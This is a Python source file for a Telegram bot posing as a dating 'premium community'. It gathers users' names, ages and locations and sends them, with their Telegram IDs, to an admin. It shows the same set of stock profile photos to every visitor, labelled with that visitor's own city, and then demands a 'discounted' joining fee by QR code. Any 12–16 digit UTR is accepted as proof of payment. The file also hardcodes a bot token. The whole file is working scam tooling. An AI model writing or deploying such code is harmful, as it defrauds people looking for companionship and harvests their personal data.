import re
from collections import defaultdict
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters
)

# ---------------- CONFIG ----------------
TOKEN = "8541678914:AAFux-COt-fm2IZPRHO-MQu_TgSDDh9M5l8"
ADMIN_ID = 1638005081
PRIVATE_LINK = "https://t.me/+XWovofCRdOE0Mzk1"
QR_IMAGE = "AgACAgUAAxkBAALLGWnbZnI_-2awAZVOxaoGgUnyUsrNAAIWD2sb20fgVsvJ2nHqOReTAQADAgADeQADOwQ"

PAGE_SIZE = 5

PAYMENT_MESSAGE = (
    "🔒 Premium Access Required\n\n"
    "To maintain a safe and genuine community, we charge a small joining fee.\n\n"
    "This fee helps us:\n"
    "• Verify real users\n"
    "• Protect privacy & identity\n"
    "• Maintain a secure environment\n\n"
    "Only serious members proceed further.\n\n"
    "💰 Original Price: ₹2499 ❌\n"
    "🔥 Offer Price: ₹999"
)
# ---------------- STORAGE ----------------
PROFILE_LIKES = defaultdict(int)

PROFILES_DB = { ("Male","Younger"):[
{"name":"Ananya","age":22,"photo":"AgACAgUAAxkBAAK-yGnbJu-dxuoVwcPDgQt_vVCHr8uKAAJfDmsb20fgVqmkrHoxdKvPAQADAgADeQADOwQ"},
{"name":"Priya","age":23,"photo":"AgACAgUAAxkBAAK-zGnbJxyG4j-r15VXx_ofzDLrQ634AAJgDmsb20fgVvm1BSUlHna_AQADAgADeQADOwQ"},
{"name":"Riya","age":21,"photo":"AgACAgUAAxkBAAK-zmnbJzha44Bx1fQeZESnoH1FaKcMAAJhDmsb20fgVs37uifQBZEUAQADAgADeQADOwQ"},
{"name":"Sneha","age":24,"photo":"AgACAgUAAxkBAAK-q2nbGsfRb6EkcKVb210MhTaSOYykAAJODmsb20fgVuFpydSBQX_UAQADAgADeQADOwQ"},
{"name":"Megha","age":23,"photo":"AgACAgUAAxkBAAK-0mnbJ2mbPjzvNHbCv-i3j653IHMZAAJjDmsb20fgVhPjS5-u9_4aAQADAgADeQADOwQ"},
{"name":"Divya","age":22,"photo":"AgACAgUAAxkBAAK-1GnbJ4Yuz6WavuNFYsWFJbKeAzuzAAJlDmsb20fgVtdKG1klfgNPAQADAgADeQADOwQ"},
{"name":"Aisha","age":25,"photo":"AgACAgUAAxkBAAK-1mnbJ6QnuXm_yPt7y__RXy0YyHLDAAJmDmsb20fgVnHpYDJfy6I-AQADAgADeQADOwQ"},
{"name":"Nisha","age":27,"photo":"AgACAgUAAxkBAAK-2GnbJ8pCsXaOuuEGOjUAAS75fQq0LAACZw5rG9tH4FZ9RTKv6dwO-QEAAwIAA3kAAzsE"},
{"name":"Shreya","age":26,"photo":"AgACAgUAAxkBAAK-2mnbJ_HBb-2PDAaMmzKpzYbMyATVAAJpDmsb20fgVtUmZaNsXk0cAQADAgADeQADOwQ"}
],

("Male","Older"):[
{"name":"Pooja","age":29,"photo":"AgACAgUAAxkBAAK-3WnbKHxifhfoq_z8V--jS1dbF-Y8AAJqDmsb20fgVjMpO-UEGv63AQADAgADeQADOwQ"},
{"name":"krupa","age":31,"photo":"AgACAgUAAxkBAAK-32nbKJbCk1xcPEZakInm4MrToMO8AAJsDmsb20fgVvG3zvlKpnV1AQADAgADeQADOwQ"},
{"name":"geeta","age":33,"photo":"AgACAgUAAxkBAAK-4WnbKMhKfiHcE-ssd5MbRh01v4QAA20OaxvbR-BWL9yl1fLpvqsBAAMCAAN5AAM7BA"},
{"name":"meena","age":30,"photo":"AgACAgUAAxkBAAK-42nbKN_oYksxEMyeTTJztsCHSHruAAJuDmsb20fgVvc2dtzx1YWBAQADAgADeQADOwQ"},
{"name":"asha","age":32,"photo":"AgACAgUAAxkBAAK-5WnbKPsVcQqkr-51utIjMgwx6jguAAJvDmsb20fgVrW1MFOpCZBzAQADAgADeQADOwQ"},
{"name":"kavita","age":36,"photo":"AgACAgUAAxkBAAK-52nbKRegzbVfCGI-xGxNBTf4ZAECAAJwDmsb20fgVj3uXo1gcq6xAQADAgADeQADOwQ"},
{"name":"sangeeta","age":34,"photo":"AgACAgUAAxkBAAK-6WnbKThrQgV4eFdKOK6KAkpxmgfBAAJxDmsb20fgVvJcrtxbIEiJAQADAgADeQADOwQ"},
{"name":"sudha","age":40,"photo":"AgACAgUAAxkBAAK-62nbKVIKWUlLoyutnu4GMWBx7wGBAAJyDmsb20fgVuG17jXeS8DvAQADAgADeQADOwQ"},
{"name":"kalyani","age":37,"photo":"AgACAgUAAxkBAAK-7WnbKXAZ61C8DVbZI9Ba4-xdAAFgYwACcw5rG9tH4Fa1vOjmi96x6AEAAwIAA3kAAzsE"},
{"name":"Kavya","age":38,"photo":"AgACAgUAAxkBAAK-72nbKYe2RBrQmkIv3w3GrtRsaVEiAAJ0Dmsb20fgVplkpNAYTaVmAQADAgADeQADOwQ"}
],

("Male","Does not matter"):[
{"name":"Ananya","age":22,"photo":"AgACAgUAAxkBAAK-yGnbJu-dxuoVwcPDgQt_vVCHr8uKAAJfDmsb20fgVqmkrHoxdKvPAQADAgADeQADOwQ"},
{"name":"Priya","age":23,"photo":"AgACAgUAAxkBAAK-zGnbJxyG4j-r15VXx_ofzDLrQ634AAJgDmsb20fgVvm1BSUlHna_AQADAgADeQADOwQ"},
{"name":"Riya","age":21,"photo":"AgACAgUAAxkBAAK-zmnbJzha44Bx1fQeZESnoH1FaKcMAAJhDmsb20fgVs37uifQBZEUAQADAgADeQADOwQ"},
{"name":"Sneha","age":24,"photo":"AgACAgUAAxkBAAK-q2nbGsfRb6EkcKVb210MhTaSOYykAAJODmsb20fgVuFpydSBQX_UAQADAgADeQADOwQ"},
{"name":"Megha","age":23,"photo":"AgACAgUAAxkBAAK-0mnbJ2mbPjzvNHbCv-i3j653IHMZAAJjDmsb20fgVhPjS5-u9_4aAQADAgADeQADOwQ"},
{"name":"Divya","age":22,"photo":"AgACAgUAAxkBAAK-1GnbJ4Yuz6WavuNFYsWFJbKeAzuzAAJlDmsb20fgVtdKG1klfgNPAQADAgADeQADOwQ"},
{"name":"Aisha","age":25,"photo":"AgACAgUAAxkBAAK-1mnbJ6QnuXm_yPt7y__RXy0YyHLDAAJmDmsb20fgVnHpYDJfy6I-AQADAgADeQADOwQ"},
{"name":"Nisha","age":27,"photo":"AgACAgUAAxkBAAK-2GnbJ8pCsXaOuuEGOjUAAS75fQq0LAACZw5rG9tH4FZ9RTKv6dwO-QEAAwIAA3kAAzsE"},
{"name":"Shreya","age":26,"photo":"AgACAgUAAxkBAAK-2mnbJ_HBb-2PDAaMmzKpzYbMyATVAAJpDmsb20fgVtUmZaNsXk0cAQADAgADeQADOwQ"},
{"name":"Pooja","age":29,"photo":"AgACAgUAAxkBAAK-3WnbKHxifhfoq_z8V--jS1dbF-Y8AAJqDmsb20fgVjMpO-UEGv63AQADAgADeQADOwQ"},
{"name":"krupa","age":31,"photo":"AgACAgUAAxkBAAK-32nbKJbCk1xcPEZakInm4MrToMO8AAJsDmsb20fgVvG3zvlKpnV1AQADAgADeQADOwQ"},
{"name":"geeta","age":33,"photo":"AgACAgUAAxkBAAK-4WnbKMhKfiHcE-ssd5MbRh01v4QAA20OaxvbR-BWL9yl1fLpvqsBAAMCAAN5AAM7BA"},
{"name":"meena","age":30,"photo":"AgACAgUAAxkBAAK-42nbKN_oYksxEMyeTTJztsCHSHruAAJuDmsb20fgVvc2dtzx1YWBAQADAgADeQADOwQ"},
{"name":"asha","age":32,"photo":"AgACAgUAAxkBAAK-5WnbKPsVcQqkr-51utIjMgwx6jguAAJvDmsb20fgVrW1MFOpCZBzAQADAgADeQADOwQ"},
{"name":"kavita","age":36,"photo":"AgACAgUAAxkBAAK-52nbKRegzbVfCGI-xGxNBTf4ZAECAAJwDmsb20fgVj3uXo1gcq6xAQADAgADeQADOwQ"},
{"name":"sangeeta","age":34,"photo":"AgACAgUAAxkBAAK-6WnbKThrQgV4eFdKOK6KAkpxmgfBAAJxDmsb20fgVvJcrtxbIEiJAQADAgADeQADOwQ"},
{"name":"sudha","age":40,"photo":"AgACAgUAAxkBAAK-62nbKVIKWUlLoyutnu4GMWBx7wGBAAJyDmsb20fgVuG17jXeS8DvAQADAgADeQADOwQ"},
{"name":"kalyani","age":37,"photo":"AgACAgUAAxkBAAK-7WnbKXAZ61C8DVbZI9Ba4-xdAAFgYwACcw5rG9tH4Fa1vOjmi96x6AEAAwIAA3kAAzsE"},
{"name":"Kavya","age":38,"photo":"AgACAgUAAxkBAAK-72nbKYe2RBrQmkIv3w3GrtRsaVEiAAJ0Dmsb20fgVplkpNAYTaVmAQADAgADeQADOwQ"}
],



("Female","Younger"):[
{"name":"Rahul","age":21,"photo":"AgACAgUAAxkBAAK-8WnbKhIxKgjr1QWFufeNi5xN5rJ1AAJ1Dmsb20fgVmkPDmg1l6SmAQADAgADeAADOwQ"},
{"name":"Arjun","age":23,"photo":"AgACAgUAAxkBAAK-82nbKjE0kAHYnjo0WHQRwwXzCz3cAAJ2Dmsb20fgVvCHXan6AAHWwQEAAwIAA3kAAzsE"},
{"name":"Vikram","age":27,"photo":"AgACAgUAAxkBAAK-9WnbPyHrdcpfYIumxDcMnFpdt5bSAAKWDmsb20fgVk98BSwKst0zAQADAgADeQADOwQ"},
{"name":"Amit","age":28,"photo":"AgACAgUAAxkBAAK-92nbQTyFy3KGx79QGUSD_-oxv-1YAAKbDmsb20fgVlSX99cl7X-aAQADAgADeQADOwQ"},
{"name":"Karan","age":25,"photo":"AgACAgUAAxkBAAK--WnbQXCf4iQM1DcOJ-_aUrhHteoCAAKcDmsb20fgVma3SwLpgoSIAQADAgADeQADOwQ"}
],

("Female","Older"):[
{"name":"Sukesh","age":30,"photo":"AgACAgUAAxkBAAK--2nbQdQNKoMTJJe4t0ev9x5uR3MIAAKeDmsb20fgVkvswqQ5RTOOAQADAgADeAADOwQ"},
{"name":"Sunil","age":34,"photo":"AgACAgUAAxkBAAK-_WnbQgpsB5XkmuwNYt5y09OOkRrQAAKfDmsb20fgVvMhDAqq9mieAQADAgADeQADOwQ"},
{"name":"Joseph","age":32,"photo":"AgACAgUAAxkBAAK-_2nbQjs1jO3en43frZnn2DiiTL7WAAKjDmsb20fgVuP96kuu_nPjAQADAgADeQADOwQ"},
{"name":"Anil","age":38,"photo":"AgACAgUAAxkBAAK_AWnbQlzRX0F03gVho11wJZ1vdyVJAAKkDmsb20fgVlE-k2YFPqw5AQADAgADeQADOwQ"},
{"name":"Vijay","age":38,"photo":"AgACAgUAAxkBAAK_A2nbQoS2KPqJJeV1DztdEWnxtByDAAKlDmsb20fgVsGXBnI93HXpAQADAgADeQADOwQ"}
],

("Female","Does not matter"):[
{"name":"Rahul","age":21,"photo":"AgACAgUAAxkBAAK-8WnbKhIxKgjr1QWFufeNi5xN5rJ1AAJ1Dmsb20fgVmkPDmg1l6SmAQADAgADeAADOwQ"},
{"name":"Arjun","age":23,"photo":"AgACAgUAAxkBAAK-82nbKjE0kAHYnjo0WHQRwwXzCz3cAAJ2Dmsb20fgVvCHXan6AAHWwQEAAwIAA3kAAzsE"},
{"name":"Vikram","age":27,"photo":"AgACAgUAAxkBAAK-9WnbPyHrdcpfYIumxDcMnFpdt5bSAAKWDmsb20fgVk98BSwKst0zAQADAgADeQADOwQ"},
{"name":"Amit","age":28,"photo":"AgACAgUAAxkBAAK-92nbQTyFy3KGx79QGUSD_-oxv-1YAAKbDmsb20fgVlSX99cl7X-aAQADAgADeQADOwQ"},
{"name":"Karan","age":25,"photo":"AgACAgUAAxkBAAK--WnbQXCf4iQM1DcOJ-_aUrhHteoCAAKcDmsb20fgVma3SwLpgoSIAQADAgADeQADOwQ"},
{"name":"Sukesh","age":30,"photo":"AgACAgUAAxkBAAK--2nbQdQNKoMTJJe4t0ev9x5uR3MIAAKeDmsb20fgVkvswqQ5RTOOAQADAgADeAADOwQ"},
{"name":"Sunil","age":34,"photo":"AgACAgUAAxkBAAK-_WnbQgpsB5XkmuwNYt5y09OOkRrQAAKfDmsb20fgVvMhDAqq9mieAQADAgADeQADOwQ"},
{"name":"Joseph","age":32,"photo":"AgACAgUAAxkBAAK-_2nbQjs1jO3en43frZnn2DiiTL7WAAKjDmsb20fgVuP96kuu_nPjAQADAgADeQADOwQ"},
{"name":"Anil","age":38,"photo":"AgACAgUAAxkBAAK_AWnbQlzRX0F03gVho11wJZ1vdyVJAAKkDmsb20fgVlE-k2YFPqw5AQADAgADeQADOwQ"},
{"name":"Vijay","age":38,"photo":"AgACAgUAAxkBAAK_A2nbQoS2KPqJJeV1DztdEWnxtByDAAKlDmsb20fgVsGXBnI93HXpAQADAgADeQADOwQ"}
],

}
# ---------------- STATES ----------------
NAME, AGE, STATE, CITY, Q1, Q2, Q3, Q4, Q5, GENDER, IDEAL = range(11)

# ---------------- HELPERS ----------------
def restart_keyboard(options):
    return ReplyKeyboardMarkup([options, ["🔄 Restart"]], resize_keyboard=True)

def is_restart(text):
    return text == "🔄 Restart"

# ---------------- RESTART ----------------
async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("🔄 Restarted\n\nEnter your name:")
    return NAME

# ---------------- START ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    await context.bot.send_message(
        ADMIN_ID,
        f"🆕 NEW USER\n\n👤 {user.first_name}\n📛 @{user.username}\n🆔 {user.id}"
    )

    await update.message.reply_text("Enter your name:")
    return NAME

# ---------------- FLOW ----------------
async def name(update, context):
    if is_restart(update.message.text): return await restart(update, context)
    context.user_data["name"] = update.message.text
    await update.message.reply_text("Enter your age:")
    return AGE

async def age(update, context):
    if is_restart(update.message.text): return await restart(update, context)
    context.user_data["age"] = update.message.text
    await update.message.reply_text("Enter your state:")
    return STATE

async def state(update, context):
    if is_restart(update.message.text): return await restart(update, context)
    context.user_data["state"] = update.message.text
    await update.message.reply_text("Enter your city:")
    return CITY

async def city(update, context):
    if is_restart(update.message.text): return await restart(update, context)
    context.user_data["city"] = update.message.text
    await update.message.reply_text("Interested in strangers?", reply_markup=restart_keyboard(["Yes","No"]))
    return Q1

async def q1(update, context):
    if is_restart(update.message.text): return await restart(update, context)
    await update.message.reply_text("Multiple partners?", reply_markup=restart_keyboard(["Yes","No"]))
    return Q2

async def q2(update, context):
    if is_restart(update.message.text): return await restart(update, context)
    await update.message.reply_text("Video calls?", reply_markup=restart_keyboard(["Yes","No"]))
    return Q3

async def q3(update, context):
    if is_restart(update.message.text): return await restart(update, context)
    await update.message.reply_text("Meet outdoors?", reply_markup=restart_keyboard(["Yes","No"]))
    return Q4

async def q4(update, context):
    if is_restart(update.message.text): return await restart(update, context)
    await update.message.reply_text("Share photos?", reply_markup=restart_keyboard(["Yes","No"]))
    return Q5

async def q5(update, context):
    if is_restart(update.message.text): return await restart(update, context)
    await update.message.reply_text("Gender preference?", reply_markup=restart_keyboard(["Male","Female"]))
    return GENDER

async def gender(update, context):
    if is_restart(update.message.text): return await restart(update, context)
    context.user_data["gender"] = update.message.text
    await update.message.reply_text("Ideal type?", reply_markup=restart_keyboard(["Younger","Older","Does not matter"]))
    return IDEAL

# ---------------- PROFILES ----------------
async def ideal(update, context):
    if is_restart(update.message.text): return await restart(update, context)

    context.user_data["ideal_type"] = update.message.text
    context.user_data["index"] = 0

    # SEND CLEAN DATA TO ADMIN
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=(
            "📋 NEW USER PROFILE\n\n"
            f"👤 Name: {context.user_data.get('name')}\n"
            f"🎂 Age: {context.user_data.get('age')}\n"
            f"📍 Location: {context.user_data.get('city')}, {context.user_data.get('state')}\n"
            f"❤️ Preference: {context.user_data.get('gender')}\n"
            f"💭 Ideal Type: {context.user_data.get('ideal_type')}\n\n"
            "──────────────\n"
            f"🆔 ID: {update.effective_user.id}\n"
            f"📛 @{update.effective_user.username}"
        )
    )

    await send_profiles(update, context)
    return ConversationHandler.END

async def send_profiles(update, context):
    chat_id = update.effective_chat.id
    profiles = PROFILES_DB.get(
        (context.user_data["gender"], context.user_data["ideal_type"]), []
    )

    index = context.user_data.get("index", 0)
    page = profiles[index:index+PAGE_SIZE]

    for p in page:
        caption = (
            f"{p['name']}, {p['age']}\n"
            f"📍 {context.user_data.get('city')}, {context.user_data.get('state')}"
        )

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"💬 Chat with {p['name']}", callback_data=f"chat_{p['name']}")]
        ])

        await context.bot.send_photo(chat_id, p["photo"], caption=caption, reply_markup=keyboard)

    context.user_data["index"] += PAGE_SIZE

    await context.bot.send_message(
        chat_id,
        "Load more",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Load More", callback_data="load_more")]])
    )

# ---------------- BUTTON ----------------
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    user = query.from_user

    if data == "load_more":
        await send_profiles(update, context)

    elif data.startswith("chat_"):
        name = data.split("_")[1]
        PROFILE_LIKES[name] += 1

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 Continue to Payment", callback_data="show_qr")]
        ])

        await query.message.reply_text(
            PAYMENT_MESSAGE,
            reply_markup=keyboard
        )

    elif data == "show_qr":

        context.user_data["awaiting_utr"] = True

        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ I Paid", callback_data="paid")]
        ])

        await context.bot.send_photo(
            chat_id=query.message.chat_id,
            photo=QR_IMAGE,
            caption=(
                "📸 Scan the QR code to complete your payment.\n\n"
                "After payment, click 'I Paid' and enter your UTR."
            ),
            reply_markup=keyboard
        )

    elif data == "paid":
        context.user_data["awaiting_utr"] = True
        await query.message.reply_text("Enter your UTR (12–16 digits):")

# ---------------- UTR ----------------
async def handle_utr(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if context.user_data.get("awaiting_utr"):

        utr = update.message.text.strip()

        if not re.fullmatch(r"\d{12,16}", utr):
            await update.message.reply_text("❌ Invalid UTR")
            return

        user = update.effective_user
        context.user_data["awaiting_utr"] = False

        await context.bot.send_message(
            ADMIN_ID,
            (
                "💰 PAYMENT SUBMITTED\n\n"
                f"👤 Name: {user.first_name}\n"
                f"📛 @{user.username}\n"
                f"🆔 {user.id}\n"
                f"💳 UTR: {utr}"
            )
        )

        await update.message.reply_text(
            "✅ Payment received\n\n"
            "🔒 Join premium community:\n"
            f"{PRIVATE_LINK}"
        )

# ---------------- TOP ----------------
async def top(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sorted_data = sorted(PROFILE_LIKES.items(), key=lambda x: x[1], reverse=True)

    text = "🔥 Top Profiles\n\n"
    for i, (name, count) in enumerate(sorted_data[:10], 1):
        text += f"{i}. {name} ❤️ {count}\n"

    await update.message.reply_text(text)

# ---------------- MAIN ----------------
def main():
    app = Application.builder().token(TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            NAME: [MessageHandler(filters.TEXT, name)],
            AGE: [MessageHandler(filters.TEXT, age)],
            STATE: [MessageHandler(filters.TEXT, state)],
            CITY: [MessageHandler(filters.TEXT, city)],
            Q1: [MessageHandler(filters.TEXT, q1)],
            Q2: [MessageHandler(filters.TEXT, q2)],
            Q3: [MessageHandler(filters.TEXT, q3)],
            Q4: [MessageHandler(filters.TEXT, q4)],
            Q5: [MessageHandler(filters.TEXT, q5)],
            GENDER: [MessageHandler(filters.TEXT, gender)],
            IDEAL: [MessageHandler(filters.TEXT, ideal)],
        },
        fallbacks=[]
    )

    app.add_handler(conv)
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT, handle_utr))
    app.add_handler(CommandHandler("top", top))

    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
